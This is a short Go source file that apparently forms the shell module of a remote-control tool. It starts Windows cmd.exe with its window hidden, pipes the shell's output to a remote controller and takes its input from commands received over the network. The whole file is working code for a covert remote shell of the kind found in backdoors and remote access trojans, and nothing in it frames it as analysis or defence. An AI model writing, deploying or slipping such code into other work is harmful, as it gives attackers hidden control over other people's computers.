package cmd

import (
	"os/exec"
	"syscall"

	"../../controller"
	"../../lexer"
)

type CMD struct {
	Control *controller.Controller
	Opened  *exec.Cmd
	Input   chan string
}

type NetWriter struct {
	Remote *controller.Controller
}

func (n *NetWriter) Write(p []byte) (int, error) {
	s := string(p)
	n.Remote.Send(s)
	return len(p), nil
}

type NetReader struct {
	Commands *CMD
}

func (n *NetReader) Read(p []byte) (int, error) {
	line := <-n.Commands.Input
	line += "\n"
	copy(p, []byte(line))
	return len(line), nil
}

func New(control *controller.Controller) *CMD {
	op := exec.Command("cmd")
	a := &CMD{control, op, make(chan string)}
	op.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	op.Stderr = &NetWriter{control}
	op.Stdout = &NetWriter{control}
	op.Stdin = &NetReader{a}
	control.Interface("cmd", a)
	return a
}

func (cmd *CMD) Send(tk []lexer.Token) {
	s := lexer.MakeString(tk)
	cmd.Input <- s
}

func (cmd *CMD) Start() {
	go func() {
		cmd.Opened.Run()
	}()
}
